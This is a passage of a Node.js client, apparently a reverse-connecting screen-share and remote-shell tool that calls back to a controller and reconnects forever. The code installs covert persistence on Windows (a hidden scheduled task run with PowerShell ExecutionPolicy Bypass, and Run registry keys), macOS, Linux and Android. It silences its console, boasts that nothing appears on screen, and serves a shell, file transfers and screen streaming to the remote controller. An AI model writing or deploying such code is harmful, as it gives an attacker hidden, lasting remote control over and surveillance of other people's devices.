    '$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries '
      + '-DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero)',
    '$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME '
      + '-LogonType Interactive -RunLevel Limited',
    "Register-ScheduledTask -TaskName '" + taskName + "' -Action $action -Trigger $trigger "
      + '-Settings $settings -Principal $principal -Force | Out-Null',
  ].join('\n');
  const psPath = path.join(os.tmpdir(), 'cmon-' + crypto.randomBytes(8).toString('hex') + '.ps1');
  try {
    // UTF-8 with BOM: Windows PowerShell 5.1 needs it for non-ASCII paths.
    fs.writeFileSync(psPath, Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(ps, 'utf8')]));
    return runQuiet(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', psPath]);
  } finally {
    try { fs.unlinkSync(psPath); } catch { /* ignore */ }
  }
}

function registerTaskSchTasks(taskName, execute, args, workingDir) {
  const launch = args.length ? '"' + execute + '" ' + args : '"' + execute + '"';
  const launcher = workingDir
    ? 'cmd.exe /c cd /d "' + workingDir + '" && ' + launch
    : launch;
  return runQuiet(['schtasks', '/Create', '/TN', taskName, '/TR', launcher,
    '/SC', 'ONLOGON', '/RL', 'LIMITED', '/F']);
}

function windowsRegistryFallback(taskName, execute, args) {
  try {
    const launch = args.length ? '"' + execute + '" ' + args : '"' + execute + '"';
    const cmd = launch;
    const runKey = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
    const approvedKey = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run';
    const added = runQuiet(['reg', 'add', runKey, '/v', taskName, '/t', 'REG_SZ', '/d', cmd, '/f']);
    if (!added) return false;
    // 0x02 = enabled in the StartupApproved list.
    runQuiet(['reg', 'add', approvedKey, '/v', taskName, '/t', 'REG_BINARY',
      '/d', '020000000000000000000000', '/f']);
    report('[+] Registry entry: HKCU\\' + runKey + '\\' + taskName);
    return true;
  } catch (e) {
    report('[-] Registry error: ' + errorText(e));
    return false;
  }
}

function setupWindows(ip, port, silent, logFile) {
  const command = windowsCommand(ip, port, silent, logFile);
  if (registerTaskPowershell(AUTOSTART_TASK, command.execute, command.arguments, command.workingDir)) {
    report("[+] Scheduled Task '" + AUTOSTART_TASK + "' created (hidden, at logon).");
  } else if (registerTaskSchTasks(AUTOSTART_TASK, command.execute, command.arguments, command.workingDir)) {
    report("[+] Scheduled Task '" + AUTOSTART_TASK + "' created via schtasks.");
  } else {
    report('[!] schtasks failed; falling back to the registry...');
    if (!windowsRegistryFallback(AUTOSTART_TASK, command.execute, command.arguments)) {
      return false;
    }
  }
  runQuiet(['schtasks', '/Run', '/TN', AUTOSTART_TASK]);
  return true;
}

function installAutostart(ip, port, silent = true, logFile = null) {
  AUTOSTART_REPORT = [];
  try {
    report('[*] OS: ' + getOsInfo());
    report('[*] Mode: ' + (silent ? 'silent (no window)' : 'visible'));
    report('[*] Program: ' + SCRIPT_PATH + ' ' + ip + ' ' + port);
    let ok;
    try {
      if (isAndroid()) ok = setupAndroid(ip, port, silent, logFile);
      else if (isIOS()) {
        report('[-] iOS/iPadOS does not allow persistent background apps.');
        report('    Apple suspends sandboxed apps about 30 seconds after they');
        report('    leave the foreground; only a jailbroken device can persist.');
        ok = false;
      } else if (isMacOS()) ok = setupMacos(ip, port, silent, logFile);
      else if (IS_LINUX) ok = setupLinux(ip, port, silent, logFile);
      else if (IS_WINDOWS) ok = setupWindows(ip, port, silent, logFile);
      else {
        report('[-] Unsupported OS: ' + process.platform);
        ok = false;
      }
    } catch (e) {
      report('[-] Unexpected error: ' + errorText(e));
      ok = false;
    }
    if (ok) {
      report('[+] Done. The client will start automatically after reboot/logon.');
      report('    Nothing will appear on screen - you can close the terminal window.');
    }
    return AUTOSTART_REPORT.join('\n').trim();
  } finally {
    AUTOSTART_REPORT = null;
  }
}

function removeAutostart() {
  AUTOSTART_REPORT = [];
  try {
    if (isAndroid()) {
      const bootPath = androidBootPath();
      if (fs.existsSync(bootPath)) {
        try {
          fs.unlinkSync(bootPath);
          report('[+] Boot script removed: ' + bootPath);
        } catch (e) {
          report('[-] Could not remove ' + bootPath + ': ' + errorText(e));
        }
      } else report('[-] No Termux:Boot entry found.');
      report('[+] A running client stays up until closed or Termux is stopped.');
    } else if (isIOS()) {
      report('[-] Nothing to remove: iOS/iPadOS does not allow persistent');
      report('    background apps, so no autostart entry can exist (stock iOS).');
    } else if (isMacOS()) {
      const label = macosLabel();
      const plistPath = macosPlistPath();
      let removed = false;
      if (fs.existsSync(plistPath)) {
        try {
          fs.unlinkSync(plistPath);          // remove first: never lose it
          removed = true;
        } catch (e) {
          report('[-] Could not remove ' + plistPath + ': ' + errorText(e));
        }
      }
      if (removed) {
        // Do not bootout synchronously: this request is normally served by the
        // LaunchAgent itself, and killing it here would drop the reply.
        runLater(['launchctl', 'bootout', 'gui/' + currentUid() + '/' + label]);
      }
      report(removed ? '[+] macOS autostart removed.' : '[-] No LaunchAgent found.');
      if (removed) report('[+] The auto-started client instance (if running) will stop shortly.');
    } else if (IS_LINUX) {
      let removed = false;
      const userPath = path.join(homeDir(), '.config', 'systemd', 'user', AUTOSTART_SERVICE);
      let userRemoved = false;
      if (fs.existsSync(userPath)) {
        // disable (without --now) only removes the enable symlinks; deleting
        // the unit first means a stop can never leave it behind, and the reply
        // is sent before the detached stop.
        runQuiet(['systemctl', '--user', 'disable', AUTOSTART_SERVICE]);
        try {
          fs.unlinkSync(userPath);
          userRemoved = removed = true;
        } catch (e) {
          report('[-] Could not remove ' + userPath + ': ' + errorText(e));
        }
        runQuiet(['systemctl', '--user', 'daemon-reload']);
      }
      const systemPath = '/etc/systemd/system/' + AUTOSTART_SERVICE;
      let systemRemoved = false;
      if (fs.existsSync(systemPath)) {
        if (currentUid() === 0) {
          runQuiet(['systemctl', 'disable', AUTOSTART_SERVICE]);
          try {
            fs.unlinkSync(systemPath);
            systemRemoved = removed = true;
          } catch (e) {
            report('[-] Could not remove ' + systemPath + ': ' + errorText(e));
          }
          runQuiet(['systemctl', 'daemon-reload']);
        } else {
          report('[-] A system service exists - remove it with sudo.');
        }
      }
      if (userRemoved) runLater(['systemctl', '--user', 'stop', AUTOSTART_SERVICE]);
      if (systemRemoved) runLater(['systemctl', 'stop', AUTOSTART_SERVICE]);
      report(removed ? '[+] Autostart removed.' : '[-] No autostart entry found.');
      if (removed) report('[+] The auto-started client instance (if running) will stop shortly.');
    } else if (IS_WINDOWS) {
      runQuiet(['schtasks', '/Delete', '/TN', AUTOSTART_TASK, '/F']);
      for (const key of [
        'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
        'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run',
      ]) {
        runQuiet(['reg', 'delete', key, '/v', AUTOSTART_TASK, '/f']);
      }
      try { fs.unlinkSync(vbsPath()); } catch { /* may not exist */ }
      report('[+] Windows autostart removed.');
      report('[+] A running client stays up until closed or rebooted.');
    } else {
      report('[-] Unsupported OS: ' + process.platform);
    }
    return AUTOSTART_REPORT.join('\n').trim();
  } finally {
    AUTOSTART_REPORT = null;
  }
}

// ---------------------------------------------------------------------------
// main(): reconnect-forever loop (mirrors client.py main)
// ---------------------------------------------------------------------------
async function main() {
  setupLogging();
  silenceConsole();
  if (!VALID_CONNECTION_TYPES.has(CONNECTION_TYPE)) {
    log('[!] Unknown connection_type ' + JSON.stringify(CONNECTION_TYPE)
      + '. Use auto, tcp, http or https.');
    return;
  }
  if (process.argv.includes('-h') || process.argv.includes('--help')) {
    log('usage: node client.js [address] [optional_port] [options]');
    return;
  }

  const args = parseArgs(process.argv.slice(2));
  const displayAddress = (['tcp', 'tls', 'http', 'https'].includes(args.scheme)
    ? args.scheme + '://' : '') + hostHeader(args.host, args.port);

  log('[+] Reverse auto-transport screen-share client v20 (node)');
  log('[i] Controller: ' + displayAddress + '  (preference: ' + CONNECTION_TYPE.toUpperCase() + ')');

  if (args.remove) {
    log(removeAutostart());
    return;
  }
  if (args.persist) {
    log(installAutostart(displayAddress, args.port, !args.visible, args.logFile));
    return;
  }

  if (isIOS()) log('[i] iOS/iPadOS: stock iOS suspends sandboxed apps ~30s after they leave the foreground.');
  if (isAndroid()) {
    androidWakeLock(true);
  }

  const target = {
    host: args.host,
    port: args.port,
    scheme: args.scheme,
    displayAddress,
    currentDir: process.cwd(),
  };

  for (;;) {
    let failures = 0;
    let conn = null;
    let transportLabel = '?';
    for (;;) {
      try {
        const opened = await openControllerConnection(target.host, target.port, target.scheme);
        conn = opened.conn;
        transportLabel = opened.variant;
        break;
      } catch (e) {
        failures += 1;
        if (failures === 1 || failures % 10 === 0) {
          log('[!] Controller not reachable at ' + displayAddress + ' - '
            + connectErrorHint(e) + '; retrying every ' + RETRY_DELAY + 's...');
        }
        conn = null;
        await sleep(RETRY_DELAY * 1000);
      }
    }

    log('[+] Connected to ' + displayAddress + ' using ' + transportLabel + ' (automatic transport)');
    try { tuneSocket(conn.socket); } catch { /* ignore */ }

    let stop = false;
    try {
      stop = await serveSession(conn, target);
      log('[i] Session ended (transport ' + transportLabel + ', stop=' + stop + ').');
    } catch (e) {
      log('[!] Connection error: ' + errorText(e) + '. Reconnecting...');
    }

    try { await stopStream(0.5); } catch { /* ignore */ }
    try { stopShell(); } catch { /* ignore */ }
    stopPortalHelper();
    stopPsCursorHelper();
    abortOutgoingTransfers();
    abortIncomingTransfers();
    try { conn.close(); } catch { /* ignore */ }

    if (stop) {
      log('[+] Controller requested shutdown. Exiting.');
      break;
    }
    await sleep(RETRY_DELAY * 1000);
  }
}

(async function boot() {
  for (;;) {
    try {
      await main();
      break;
    } catch (e) {
      log('[!] Unexpected fatal error: ' + errorText(e) + ' - restarting in ' + RETRY_DELAY + 's...');
      await sleep(RETRY_DELAY * 1000);
    }
  }
})();
